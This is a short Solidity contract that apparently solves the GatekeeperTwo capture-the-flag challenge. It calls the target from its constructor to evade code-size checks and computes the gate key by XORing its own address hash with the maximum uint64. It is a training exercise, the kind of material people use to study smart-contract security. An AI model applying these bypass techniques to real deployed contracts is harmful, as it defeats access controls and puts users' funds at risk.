// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperAttacker {
    constructor(address gate) public {
        bytes8 key = getKey();

        GatekeeperTwo(gate).enter(key);
    }

    function getKey() internal view returns (bytes8) {
        return (
            bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                    (uint64(0) - 1) // Or (type(uint64).max)
            )
        );
    }
}
